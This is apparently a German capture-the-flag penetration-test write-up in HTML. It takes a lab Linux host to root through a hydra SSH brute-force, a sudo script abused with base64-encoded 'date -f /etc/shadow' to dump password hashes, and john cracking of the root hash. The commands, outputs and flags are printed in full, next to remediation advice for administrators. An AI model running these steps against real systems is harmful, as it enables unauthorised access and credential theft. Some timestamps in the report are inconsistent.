+            <p class="analysis">**Analyse:** Eine URL zu einem Online-Viewer (products.groupdocs.app) wird angegeben, der offenbar verwendet wurde, um den Inhalt der `data.xlsx`-Datei anzuzeigen. Darunter wird der tabellarische Inhalt der Excel-Datei dargestellt, der exakt der Tabelle entspricht, die wir bereits im Kontext der Passwort-Generierung analysiert haben (Jahre 2015-2020, Quartale 1-4, Zeitcode, Verkaufsmenge). Die chinesischen Überschriften sind ebenfalls sichtbar.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den Inhalt der exfiltrierten `data.xlsx`. Diese Daten waren der Schlüssel zur Rekonstruktion der Passwort-Generierungslogik für den SSH-Zugang von `mathlake`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Analyse dieser Daten (wie zuvor durchgeführt: Extrapolation, Quartalsindizes) war korrekt und führte zum initialen Zugang.<br>**Empfehlung (Admin):** Sensible Daten (auch scheinbar harmlose Verkaufszahlen) sollten nicht ungeschützt in E-Mail-Anhängen oder zugänglichen Verzeichnissen abgelegt werden, insbesondere wenn sie in Kombination mit anderen Hinweisen (wie der E-Mail) zur Kompromittierung führen können.</p>
+            <p class="analysis">
+                Zur Rekonstruktion der Passwort-Generierungslogik war die Analyse der in der E-Mail erwähnten "Daten" entscheidend. Diese wurden später auf dem System im Verzeichnis `/var/mail/mathlake/` als `data.xlsx` gefunden und enthielten die folgende Tabelle:
+            </p>
+
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Jahr</th>
+                        <th>Quartal</th>
+                        <th>Zeitcode</th>
+                        <th>Verkaufsmenge</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>2015</td><td>1</td><td>1</td><td>25</td></tr>
+                    <tr><td>2015</td><td>2</td><td>2</td><td>32</td></tr>
+                    <tr><td>2015</td><td>3</td><td>3</td><td>37</td></tr>
+                    <tr><td>2015</td><td>4</td><td>4</td><td>26</td></tr>
+                    <tr><td>2016</td><td>1</td><td>5</td><td>30</td></tr>
+                    <tr><td>2016</td><td>2</td><td>6</td><td>38</td></tr>
+                    <tr><td>2016</td><td>3</td><td>7</td><td>42</td></tr>
+                    <tr><td>2016</td><td>4</td><td>8</td><td>30</td></tr>
+                    <tr><td>2017</td><td>1</td><td>9</td><td>29</td></tr>
+                    <tr><td>2017</td><td>2</td><td>10</td><td>39</td></tr>
+                    <tr><td>2017</td><td>3</td><td>11</td><td>50</td></tr>
+                    <tr><td>2017</td><td>4</td><td>12</td><td>35</td></tr>
+                    <tr><td>2018</td><td>1</td><td>13</td><td>30</td></tr>
+                    <tr><td>2018</td><td>2</td><td>14</td><td>39</td></tr>
+                    <tr><td>2018</td><td>3</td><td>15</td><td>51</td></tr>
+                    <tr><td>2018</td><td>4</td><td>16</td><td>37</td></tr>
+                    <tr><td>2019</td><td>1</td><td>17</td><td>29</td></tr>
+                    <tr><td>2019</td><td>2</td><td>18</td><td>42</td></tr>
+                    <tr><td>2019</td><td>3</td><td>19</td><td>55</td></tr>
+                    <tr><td>2019</td><td>4</td><td>20</td><td>38</td></tr>
+                    <tr><td>2020</td><td>1</td><td>21</td><td>31</td></tr>
+                    <tr><td>2020</td><td>2</td><td>22</td><td>43</td></tr>
+                    <tr><td>2020</td><td>3</td><td>23</td><td class="highlighted-cell">54</td></tr>
+                    <tr><td>2020</td><td>4</td><td>24</td><td>41</td></tr>
+                </tbody>
+            </table>
+
+            <p class="evaluation">
+                **Bewertung der Tabelle:** Die Tabelle zeigt Verkaufsdaten bis Ende 2020. Der höchste Wert im letzten Jahr (2020) ist <span class="command">54</span> (im 3. Quartal, Zeitcode 23). Da die E-Mail explizit das Zieldatum Juni 2025 nennt (welches weit über das Ende der Tabelle hinausgeht), lag die Vermutung nahe, dass eine Extrapolation dieser Daten für die Passwortgenerierung notwendig war.
+            </p>
+            <p class="analysis">
+                **Ableitung der Logik (Variable `i`):** Basierend auf dem letzten markanten Wert <span class="command">54</span> im Jahr 2020 wurde die Hypothese einer simplen linearen Extrapolation (+1 pro Jahr) aufgestellt, um den Bereich für die erste Variable (`i`, repräsentativ für den Trend 'T') zu bestimmen:
+                <ul>
+                    <li>2020 → Basis 54</li>
+                    <li>2021 → 55</li>
+                    <li>**2022 → 56**</li>
+                    <li>2023 → 57</li>
+                    <li>2024 → 58</li>
+                    <li>**2025 → 59**</li>
+                </ul>
+                Dies führte zum Bereich <span class="command">56 bis 59</span> für die erste Schleife des Passwortgenerators.
+            </p>
+             <p class="analysis">
+                **Ableitung der Logik (Variablen `j`, `k`):** Die Daten sind quartalsweise (1-4) organisiert. Durch 0-Indizierung ergibt sich der Bereich <span class="command">0 bis 3</span>. Es wurde angenommen, dass dieser Bereich für die Variablen `j` (Saisonalität 'S') und `k` (Zyklus 'C' oder Variation) verwendet wurde.
+             </p> 
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">find / -name "*.py" -o -name "*.R" 2&gt;/dev/null</span>
+<span class="command">/usr/share/apport/package-hooks/source_shadow.py</span>
+<span class="command">/usr/share/gcc-8/python/libstdcxx/__init__.py</span>
+<span class="command">/usr/share/gcc-8/python/libstdcxx/v6/__init__.py</span>
+<span class="command">/usr/share/gcc-8/python/libstdcxx/v6/printers.py</span>
+<span class="command">/usr/share/gcc-8/python/libstdcxx/v6/xmethods.py</span>
+<span class="command">/usr/share/gdb/auto-load/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25-gdb.py</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Eine systemweite Suche nach Python- (`*.py`) oder R-Skriptdateien (`*.R`) wird durchgeführt. Die gefundenen Dateien scheinen Systemdateien zu sein, die zu `apport` (Fehlerberichterstattung), `gcc` (Compiler) und `gdb` (Debugger) gehören.</p>
+            <p class="evaluation">**Bewertung:** Es wurden keine benutzerdefinierten oder verdächtigen Skripte gefunden, die auf weitere Schwachstellen oder Backdoors hindeuten könnten. Die Suche war nicht erfolgreich im Sinne von neuen Funden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Suche nach Skripten mit anderen Endungen (`.sh`, `.pl`, etc.) oder an anderen Orten (Home-Verzeichnisse, Web-Verzeichnisse) fortsetzen. Dennoch die gefundenen System-Python-Dateien ggf. auf ungewöhnliche Inhalte prüfen (unwahrscheinlich).<br>**Empfehlung (Admin):** Unnötige Skripte oder Entwickler-Tools von Produktionssystemen entfernen. Regelmäßige Überprüfung auf unbekannte oder bösartige Skripte.</p>
+
+             <p class="analysis">**Analyse:** Der Abschnitt "MAIL: note" und der folgende Textblock wiederholen den Inhalt der `note`-Datei (der E-Mail an `mathlake`), die bereits zuvor im Home-Verzeichnis von `cnb` gefunden und analysiert wurde.</p>
+             <p class="evaluation">**Bewertung:** Dient der Vollständigkeit und fasst die relevanten Hinweise aus der E-Mail nochmals zusammen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass alle Hinweise aus dieser Note (SHA-256, 3 Variablen, Datenreferenz, Zieldatum) bei der Rekonstruktion der Passwortlogik berücksichtigt wurden.<br>**Empfehlung (Admin):** Sensible Hinweise nicht in zugänglichen Dateien speichern.</p>
+
+            <p class="analysis">**Analyse:** Dieser Abschnitt ("Bericht: Rekonstruktion des Passwort-Generierungsverfahrens") ist eine Meta-Beschreibung, die den Prozess zusammenfasst, wie die Logik zur Erstellung der Passwortliste für den `hydra`-Angriff auf `mathlake`s SSH-Account rekonstruiert wurde. Er erläutert die Interpretation der Hinweise (SHA-256, T,S,C -> 3 Variablen, Datenbezug), die Ableitung der Zahlenbereiche (Extrapolation für `i`, Quartalsindizes für `j`, `k`) und die Implementierung im Skript. Die Schlussfolgerung betont die CTF-typische Logik.</p>
+            <p class="evaluation">**Bewertung:** Dies ist eine exzellente Zusammenfassung des Denkprozesses und der Methodik, die zum initialen SSH-Zugang führte. Sie erklärt die Verbindung zwischen den scheinbar unzusammenhängenden Hinweisen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Solche Rekonstruktionen sind wertvoll, um komplexe Schritte im Bericht nachvollziehbar zu machen.<br>**Empfehlung (Admin):** Zeigt auf, wie scheinbar harmlose Informationen in Kombination ausgenutzt werden können. Sicherheitskonzepte sollten solche Informationslecks berücksichtigen.</p>
+
+            <p class="analysis">**Analyse:** Das Python-Skript zur Generierung der SHA-256 Hashes wird hier vollständig gezeigt. Es implementiert die rekonstruierte Logik mit drei verschachtelten Schleifen (`i` von 56-59, `j` von 0-3, `k` von 0-3), erstellt die `i*j*k`-Strings, hasht sie mit `hashlib.sha256` und schreibt das Ergebnis in die Datei `password_hashes.txt`.</p>
+            <p class="evaluation">**Bewertung:** Dies ist die technische Umsetzung der Passwortgenerierungs-Logik. Das Skript ist korrekt und erzeugt die 64 Hash-Kandidaten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dieses Skript (oder das äquivalente Bash-Skript `fff.sh`) verwenden, um die Passwortliste für den `hydra`-Angriff zu erstellen.<br>**Empfehlung (Admin):** Keine direkte Relevanz für die Verteidigung, außer dem Verständnis, wie Angreifer Passwortlisten generieren könnten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi fff.sh</span></div>
+                     <pre></pre> <!-- Editor wird geöffnet -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">./fff.sh > neutest.txt</span></div>
+                      <pre></pre> <!-- Skript läuft, Ausgabe wird umgeleitet -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Hier wird gezeigt, wie das äquivalente Bash-Skript (`fff.sh`, Inhalt nicht gezeigt, aber vermutlich die drei verschachtelten Schleifen mit `echo | sha256sum`) erstellt und ausgeführt wird. Die Ausgabe (die 64 Hashes) wird in die Datei `neutest.txt` umgeleitet.</p>
+            <p class="evaluation">**Bewertung:** Alternative Implementierung der Passwortgenerierung mittels Bash.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Entweder das Python- oder das Bash-Skript verwenden, das Ergebnis ist dasselbe.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">hydra -l mathlake -P password_hashes.txt ssh://192.168.2.183 -t 64 -V -I</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-25 14:53:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 64 login tries (l:1/p:64), ~1 try per task
+[DATA] attacking ssh://192.168.2.183:22/
+[ATTEMPT] target 192.168.2.183 - login "mathlake" - pass "d5e6d85efbb0834c984fe16326358143cc29f235be6904cb23cc281ce07a387c" - 1 of 64 [child 0] (0/0)
+[ATTEMPT] target 192.168.2.183 - login "mathlake" - pass "98c8ca3bc81773ad081669b2379818fa58679d7243dbfa9717f59910155b2752" - 2 of 64 [child 1] (0/0)
+[ATTEMPT] target 192.168.2.183 - login "mathlake" - pass "acf412a4d6882e1fe02687280db43a4dac260cc19f5861d8a9ae1db5eebdc5c1" - 3 of 64 [child 2] (0/0)
+.....
+[ATTEMPT] target 192.168.2.183 - login "mathlake" - pass "<span class="password">9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3</span>" - 6 of 64 [child 5] (0/0)
+.....
+....
+...
+<span class="password">[22][ssh] host: 192.168.2.183   login: mathlake   password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3</span>
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+[WARNING] Writing restore file because 26 final worker threads did not complete until end.
+<span class="password">[ERROR] 26 targets did not resolve or could not be connected</span>
+<span class="password">[ERROR] 0 target did not complete</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-23 10:53:17
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst des Ziels (`ssh://192.168.2.183`) durchzuführen. `-l mathlake` gibt den Benutzernamen an. `-P password_hashes.txt` (oder `neutest.txt`) gibt die Datei mit den Passwortkandidaten (den 64 Hashes) an. `-t 64` versucht, 64 parallele Verbindungen zu nutzen (wovor Hydra warnt). `-V` aktiviert die ausführliche Ausgabe (zeigt jeden Versuch), `-I` ignoriert vorhandene Restore-Dateien. Die Ausgabe zeigt die einzelnen Versuche. Beim 6. Versuch mit dem Hash `9bd29d2c...` ist Hydra erfolgreich und meldet am Ende das gefundene Passwort.</p>
+            <p class="evaluation">**Bewertung:** Der Brute-Force-Angriff mit der korrekt generierten Passwortliste war erfolgreich. Das Passwort für `mathlake` wurde gefunden. Die Fehlermeldungen am Ende bzgl. nicht beendeter Threads oder nicht erreichbarer Ziele sind wahrscheinlich auf das hohe `-t 64` zurückzuführen, aber das Ergebnis (gefundenes Passwort) ist dennoch gültig.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den gefundenen Hash als Passwort für den SSH-Login von `mathlake` verwenden.<br>**Empfehlung (Admin):** Brute-Force-Schutz (fail2ban) implementieren. SSH-Zugriff auf Schlüsselbasis umstellen und Passwort-Login deaktivieren oder stark einschränken (z.B. nur für bestimmte IPs erlauben).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">ssh mathlake@192.168.2.183</span></div>
+                      <pre>
+mathlake@192.168.2.183's password: <span class="password">[Passwort 9bd29d2c... wurde eingegeben]</span>
+Last failed login: Sat Apr 26 06:39:31 CST 2025 from 192.168.2.199 on ssh:notty
+There were 1211 failed login attempts since the last successful login.
+Last login: Fri Apr 25 07:09:39 2025 from 192.168.2.199
+
+<span class="command">[mathlake@mathdop ~]$</span> <span class="command">id</span>
+<span class="command">uid=1000(mathlake) gid=1000(mathlake) Gruppen=1000(mathlake) Kontext=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+
+<span class="command">[mathlake@mathdop ~]$</span> <span class="command">sudo -l</span>
+Passende Defaults-Einträge für mathlake auf mathdop:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+Der Benutzer mathlake darf die folgenden Befehle auf mathdop ausführen:
+    <span class="password">(ALL) NOPASSWD: /opt/secure_input_handler.sh</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der SSH-Login als Benutzer `mathlake` mit dem von `hydra` gefundenen Passwort-Hash (`9bd29d2c...`) ist erfolgreich. Nach dem Login wird mit `id` die Benutzer- und Gruppen-ID bestätigt (uid=1000). Anschließend wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen für `mathlake` zu überprüfen. Die Ausgabe zeigt, dass `mathlake` den Befehl `/opt/secure_input_handler.sh` als jeder Benutzer (`ALL`) ohne Passwortabfrage (`NOPASSWD`) ausführen darf.</p>
+             <p class="evaluation">**Bewertung:** **Initial Access erfolgreich!** Der Zugang als `mathlake` wurde erlangt. Die `sudo -l` Ausgabe enthüllt sofort einen **klaren Privilege Escalation Vektor**: Das Skript `/opt/secure_input_handler.sh` kann mit Root-Rechten ausgeführt werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Das Skript `/opt/secure_input_handler.sh` analysieren (wie im nächsten Schritt geschehen) und eine Methode finden, um die darin enthaltenen Filter und Whitelists zu umgehen und Code als `root` auszuführen.<br>**Empfehlung (Admin):** Die `sudo`-Regel ist extrem unsicher. Niemals `NOPASSWD` für Skripte verwenden, die potenziell manipulierbare Eingaben verarbeiten oder Shell-Befehle ausführen. Wenn ein Skript mit erhöhten Rechten laufen muss, sollte es sorgfältig geprüft und gehärtet werden, und die `sudo`-Regel sollte so spezifisch wie möglich sein (z.B. nur erlauben, das Skript als ein bestimmter, unprivilegierter Benutzer auszuführen, oder nur mit festen, ungefährlichen Argumenten).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">[mathlake@mathdop ~]$</span> <span class="command">cat /opt/secure_input_handler.sh</span>
+
+#!/bin/bash
+export PATH="/usr/bin"
+
+read -p "Input Command: " user_input
+
+decoded_input=$(echo -n "$user_input" | base64 -d 2&gt;/dev/null | tr -d '\r\0\a' | col -b)
+if [[ ${#user_input} -gt 128 || -z "$decoded_input" ]]; then
+    echo "[!] Decoding failed or input is too long" &gt;&amp;2
+    exit 2
+fi
+
+filtered_input=$(echo "$decoded_input" | tr -cd 'a-zA-Z0-9\-_/ :.' | sed -e 's/[[:space:]]\+/ /g' -e 's/^[ \t]*//' -e 's/[ \t]*$//')
+
+IFS=' ' read -ra cmd_args &lt;&lt;&lt; "$filtered_input"
+command="${cmd_args[0]}"
+command_clean=$(echo "$command" | tr -d -c 'a-zA-Z0-9')
+
+allowed_commands=("date" "pwd" "echo")
+if ! printf "%s\n" "${allowed_commands[@]}" | grep -qxF "$command_clean"; then
+    echo "[!] Illegal instruction: $command_clean" &gt;&amp;2
+    exit 3
+fi
+
+/usr/bin/timeout 2 /usr/bin/bash -c "${filtered_input}"
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Quellcode des Skripts `/opt/secure_input_handler.sh`, das mit `sudo` ausgeführt werden kann, wird angezeigt. Die Funktionsweise wurde bereits detailliert analysiert: Es nimmt Base64-kodierte Eingaben, dekodiert und filtert sie sehr stark (Whitelist: `a-zA-Z0-9\-_/ :.`), prüft den extrahierten Befehl gegen eine Whitelist (`date`, `pwd`, `echo`) und führt den *vollständigen gefilterten String* (`filtered_input`) schließlich mit `bash -c` und einem Timeout aus. Der `PATH` ist auf `/usr/bin` beschränkt.</p>
+             <p class="evaluation">**Bewertung:** Das Skript ist ein Versuch, eine sichere Ausführungsumgebung zu schaffen, hat aber eine **kritische Schwachstelle**: Es prüft nur den *Befehlsnamen* gegen die Whitelist, führt aber den *gesamten gefilterten String inklusive Argumenten* mit `bash -c` aus. Wenn es gelingt, einem erlaubten Befehl Argumente mitzugeben, die nach der Filterung übrig bleiben und eine Schwachstelle im Befehl selbst oder eine unerwartete Interpretation durch `bash -c` auslösen, kann dies zur Codeausführung mit den Rechten des Skripts (hier: `root`) führen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den Ansatz der Argument-Injection verfolgen. Prüfen, ob `date`, `pwd` oder `echo` mit Argumenten, die nur aus `a-zA-Z0-9\-_/ :.` bestehen, manipuliert werden können. Die Option `date -f /path/to/file` ist der vielversprechendste Kandidat, um beliebige Dateien zu lesen.<br>**Empfehlung (Admin):** Das Skript ist unsicher und sollte nicht mit `sudo` verwendet werden. Wenn eine solche Funktion benötigt wird, muss die Eingabevalidierung und -filterung wesentlich robuster sein, und idealerweise sollte die Ausführung nicht über `bash -c` erfolgen, sondern die Argumente sicher an den Zielbefehl übergeben werden.</p>
+
+            <p class="analysis">**Analyse:** Dieser Textblock wiederholt die Beschreibung des Skriptzwecks, wie sie bereits im vorherigen Analyseblock enthalten war.</p>
+            <p class="evaluation">**Bewertung:** Dient als Zusammenfassung oder Betonung der Skriptfunktion.</p>
+            <p class="recommendation">**Empfehlung (Pentester/Admin):** Siehe vorherige Empfehlungen zum Skript.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">[mathlake@mathdop ~]$</span> <span class="command">echo -n "date -f /etc/shadow" | base64</span>
+ZGF0ZSAtZiAvZXRjL3NoYWRvdw==
+
+<span class="command">[mathlake@mathdop ~]$</span> <span class="command">sudo /opt/secure_input_handler.sh</span>
+Input Command: <span class="command">ZGF0ZSAtZiAvZXRjL3NoYWRvdw==</span>
+
+date: ungültiges Datum „<span class="password"># Worth waiting for</span>“
+date: ungültiges Datum „# 9e9feaf74138c66fbaadba5a9da259c5“
+date: ungültiges Datum „<span class="password">root:$6$WUx.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::</span>“
+date: ungültiges Datum „bin:*:18353:0:99999:7:::“
+date: ungültiges Datum „daemon:*:18353:0:99999:7:::“
+date: ungültiges Datum „adm:*:18353:0:99999:7:::“
+date: ungültiges Datum „lp:*:18353:0:99999:7:::“
+date: ungültiges Datum „sync:*:18353:0:99999:7:::“
+date: ungültiges Datum „shutdown:*:18353:0:99999:7:::“
+date: ungültiges Datum „halt:*:18353:0:99999:7:::“
+date: ungültiges Datum „mail:*:18353:0:99999:7:::“
+date: ungültiges Datum „operator:*:18353:0:99999:7:::“
+date: ungültiges Datum „games:*:18353:0:99999:7:::“
+date: ungültiges Datum „ftp:*:18353:0:99999:7:::“
+date: ungültiges Datum „nobody:*:18353:0:99999:7:::“
+date: ungültiges Datum „systemd-network:!!:20157::::::“
+date: ungültiges Datum „dbus:!!:20157::::::“
+date: ungültiges Datum „polkitd:!!:20157::::::“
+date: ungültiges Datum „sshd:!!:20157::::::“
+date: ungültiges Datum „postfix:!!:20157::::::“
+date: ungültiges Datum „<span class="password">mathlake:$6$XdfsxCCu$sHnJOhJpbvkbW/aLnCE/4QyYVYW0j2DNSByRxiJ2pLuFJkXi8Yk.wD33.SEUxtTuZ3z1xYqchgilvmX2yzZsq.:20177:0:99999:7:::</span>“
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Hier wird der Exploit gegen das `sudo`-Skript durchgeführt.
+                1. Der gewünschte Befehl `date -f /etc/shadow` wird Base64-kodiert (`ZGF0ZSAtZiAvZXRjL3NoYWRvdw==`).
+                2. Das Skript wird mit `sudo` ausgeführt (`sudo /opt/secure_input_handler.sh`).
+                3. Der Base64-String wird eingegeben.
+                4. Das Skript dekodiert den String zu `date -f /etc/shadow`.
+                5. Die Filter lassen den String durch, da nur erlaubte Zeichen enthalten sind.
+                6. Der Befehl `date` wird als erlaubt erkannt.
+                7. `/usr/bin/bash -c "date -f /etc/shadow"` wird als `root` ausgeführt.
+                8. Der `date`-Befehl versucht, `/etc/shadow` zu lesen und gibt jede Zeile mit der Meldung "ungültiges Datum" aus, wodurch der **gesamte Inhalt der Shadow-Datei offengelegt** wird.</p>
+             <p class="evaluation">**Bewertung:** **Erfolgreiche Ausnutzung der `sudo`-Fehlkonfiguration und der Skript-Schwachstelle!** Kritische Systemdaten (`/etc/shadow`) wurden ausgelesen. Der Kommentar `# Worth waiting for` wird als potenzieller Hinweis erkannt. Die Passwort-Hashes für `root` und `mathlake` sind nun bekannt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den extrahierten `root`-Hash offline knacken oder den Hinweis `# Worth waiting for` als mögliches Passwort testen. Mit dem `root`-Passwort (oder durch Ausnutzen der Hashes auf andere Weise) vollständige Root-Rechte erlangen.<br>**Empfehlung (Admin):** Die `sudo`-Regel sofort korrigieren oder entfernen. Das Skript `/opt/secure_input_handler.sh` überarbeiten oder entfernen. Passwörter der betroffenen Benutzer (insbesondere `root`) ändern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">echo 'root:$6$WUx.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::' > hash</span></div>
+                     <pre></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Auf dem Angreifer-System wird der extrahierte `root`-Hash (im `user:hash`-Format, korrekt mit einfachen Anführungszeichen) in die Datei `hash` geschrieben, um sie für Passwort-Cracking-Tools wie John the Ripper vorzubereiten.</p>
+            <p class="evaluation">**Bewertung:** Korrekte Vorbereitung des Hashes für das Offline-Cracking.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Datei `hash` nun mit `john` oder `hashcat` und einer geeigneten Wortliste bearbeiten.<br>**Empfehlung (Admin):** Starke, nicht in Wörterbüchern enthaltene Passwörter verwenden, um Offline-Cracking zu erschweren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi /usr/share/wordlists/rockyou.txt</span></div>
+                      <pre></pre> <!-- Editor wird geöffnet -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Pentester öffnet die `rockyou.txt`-Wortliste mit dem `vi`-Editor. Der Zweck ist unklar – möglicherweise, um nach dem verdächtigen String `# Worth waiting for` zu suchen oder die Liste zu inspizieren.</p>
+            <p class="evaluation">**Bewertung:** Das manuelle Durchsuchen von `rockyou.txt` ist ineffizient. Es ist besser, `john` oder `hashcat` die Arbeit machen zu lassen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Editor schließen und `john` oder `hashcat` verwenden.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">Worth waiting for</span> (root)
+1g 0:00:00:00 DONE (2025-04-26 01:04) 11.11g/s 22755p/s 22755c/s 22755C/s martin..myfamily
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** John the Ripper (`john`) wird gestartet, um den in der Datei `hash` gespeicherten Hash zu knacken. `--wordlist` gibt die zu verwendende Wortliste (`rockyou.txt`) an. `--format=sha512crypt` spezifiziert den Hash-Typ ($6$). `john` lädt den Hash erfolgreich und beginnt mit dem Cracking-Prozess. Er findet das Passwort sehr schnell (`0:00:00:00 DONE`) und zeigt es an: `Worth waiting for` für den Benutzer `root`.</p>
+            <p class="evaluation">**Bewertung:** Das Passwort wurde erfolgreich geknackt und entspricht dem Hinweis aus dem Kommentar in `/etc/shadow`. Dies bestätigt die Vermutung und liefert das Klartextpasswort für den Root-Account.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das gefundene Passwort `Worth waiting for` verwenden, um sich mittels `su root` als Root anzumelden.<br>**Empfehlung (Admin):** Keine Passwörter verwenden, die direkt oder indirekt als Hinweise im System vorhanden sind. Starke, zufällige Passwörter nutzen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">[mathlake@mathdop ~]$</span> <span class="command">su root</span>
+Passwort: <span class="password">[Passwort 'Worth waiting for' wurde eingegeben]</span>
+<span class="command">[root@mathdop mathlake]#</span>
+<span class="command">[root@mathdop mathlake]#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) Gruppen=0(root) Kontext=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Zurück auf dem Zielsystem als Benutzer `mathlake`, wird `su root` ausgeführt. Das zuvor mit `john` geknackte (bzw. aus dem Hinweis abgeleitete) Passwort `Worth waiting for` wird eingegeben. Der Befehl ist erfolgreich, der Benutzer wechselt zu `root`. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+            <p class="evaluation">**Bewertung:** **Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht!** Die Privilege Escalation ist abgeschlossen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mit Root-Rechten die Root-Flagge suchen und auslesen. Das System weiter untersuchen, Persistenz etablieren (falls im Scope).<br>**Empfehlung (Admin):** System bereinigen, Schwachstellen schließen (SUID `wget`, `sudo`-Regel, unsicheres Passwort).</p>
+
+            <!-- Flags-Abschnitt wird separat behandelt -->
+
+        </section>
+
+        <!-- Flags Section -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">flag{d79b3daf297f1ad136284d93900c0fe8543a52eb}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat r00000000000000000000000000000000000000000000000000000t.txt</div>
+                    <div class="flag-value"><span class="password">flag{29975f78aafc266eaa88520357552917d1164964}</span></div>
+                </div>
+            </div>
+        </section>
+        <!-- Ende Flags Section -->
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. April 2025</p>
+    </footer>
+</body>
+</html> 
